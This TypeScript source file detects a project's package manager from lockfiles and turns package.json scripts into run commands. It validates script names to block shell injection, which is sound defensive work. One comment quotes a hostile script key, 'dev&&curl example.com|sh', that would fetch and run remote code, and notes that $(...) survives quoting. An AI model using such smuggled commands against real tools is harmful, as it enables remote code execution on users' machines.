/**
 * The scripts a project already declares, and what runs them.
 *
 * Every repository with a `package.json` carries its own list of things to run,
 * and Boite made the user retype one of them into a shortcut, per project, by
 * hand. The list is right there, it is the project's own answer to "how do I
 * start this", and it changes when the repository changes.
 *
 * Only the parsing lives here, with no store and no backend, because what
 * belongs in a test is which lockfile means which runner and which script names
 * are worth offering.
 */

export type PackageManager = "bun" | "pnpm" | "yarn" | "npm";

export interface ProjectScript {
  name: string;
  /** What the script itself says it does, for the row's second column. */
  body: string;
  /** The full command line, ready for a thread. */
  command: string;
}

/**
 * Lockfile to runner.
 *
 * In this order, because a repository can carry more than one: a `bun.lock`
 * beside a stale `package-lock.json` is a project that moved to bun and did not
 * delete the old file, and running npm there installs a second, different tree.
 */
const LOCKFILES: [string, PackageManager][] = [
  ["bun.lock", "bun"],
  ["bun.lockb", "bun"],
  ["pnpm-lock.yaml", "pnpm"],
  ["yarn.lock", "yarn"],
  ["package-lock.json", "npm"],
];

/** Which runner a folder's files say to use. npm when nothing says otherwise. */
export function detectManager(fileNames: readonly string[]): PackageManager {
  const present = new Set(fileNames);
  for (const [file, manager] of LOCKFILES) {
    if (present.has(file)) return manager;
  }
  return "npm";
}

/**
 * `npm` needs the `run`, the other three do not. Spelled out per manager rather
 * than always writing `run`, because what ends up in the thread's command line
 * is what the user reads on the row and what a reload replays.
 *
 * `start` gets no special case: `npm run start` runs the `start` script exactly
 * as `npm start` does, so one shape for every entry is one shape less to test.
 *
 * The name is pasted in raw, which is only safe because `parsePackageScripts`
 * is the sole caller and it refuses anything outside SAFE_NAME. Quoting here
 * instead would not help: this string is re-split by `parseCommand` and
 * re-joined by the backend before a shell ever sees it.
 */
export function scriptCommand(manager: PackageManager, name: string): string {
  if (manager === "npm") return `npm run ${name}`;
  return `${manager} run ${name}`;
}

/**
 * The scripts worth offering, in the order the file declares them.
 *
 * File order, not alphabetical: a `package.json` is written by a person and the
 * first entries are the ones they meant to be first. Lifecycle hooks are left
 * out because they are things a package manager runs around another command,
 * not things anybody launches on their own: a row for `prestart` is a row that
 * does half of what the `start` row beside it already does. That is a noise
 * argument and nothing more: this list is not a security boundary, and a script
 * left in it still runs whatever its body says.
 */
const LIFECYCLE =
  /^(?:(?:pre|post)?(?:install|pack|publish|prepare|prepublish|prepublishOnly|prepack|postpack|version)|dependencies|(?:pre|post)start)$/;

/**
 * Which script names are allowed to become a command line.
 *
 * A `package.json` key is arbitrary JSON text written by whoever wrote the
 * repository, and this one is cloned, not authored. `scriptCommand` pastes it
 * into `npm run <name>`, `parseCommand` splits that on whitespace and quotes,
 * and the backend joins the pieces back into a single `bash -c` line whose
 * quoting leaves a token with no space and no quote in it completely bare. A
 * key like `dev&&curl example.com|sh` therefore reaches the shell as shell,
 * and `$(...)` survives even the quoted path. The check belongs here, at the
 * edge where untrusted text enters, rather than at any of the three layers
 * downstream that each assume one of the others did it.
 *
 * Deliberately narrower than npm allows: scopes (`@scope/build`), colons
 * (`test:unit`), dots and dashes cover every real script name, and a name this
 * rejects is a name nobody can read off a palette row anyway.
 */
const SAFE_NAME = /^[A-Za-z0-9_.:@/-]+$/;

export function parsePackageScripts(
  raw: string,
  manager: PackageManager,
): ProjectScript[] {
  let parsed: unknown;
  try {
    parsed = JSON.parse(raw);
  } catch {
    // A package.json mid-edit is not an error worth a toast: the list is simply
    // not available until it parses again.
    return [];
  }
  const scripts = (parsed as { scripts?: unknown })?.scripts;
  if (!scripts || typeof scripts !== "object") return [];
  const out: ProjectScript[] = [];
  for (const [name, body] of Object.entries(scripts as Record<string, unknown>)) {
    if (typeof body !== "string") continue;
    // Dropped silently rather than shown greyed out: the palette label is the
    // only place a rejected name could be explained, and a label cannot be
    // trusted to show one: a `\n` in a key renders as a space inside the row's
    // `truncate`, so the dangerous half of the name would be invisible there.
    if (!SAFE_NAME.test(name)) continue;
    if (LIFECYCLE.test(name)) continue;
    out.push({ name, body, command: scriptCommand(manager, name) });
  }
  return out;
}
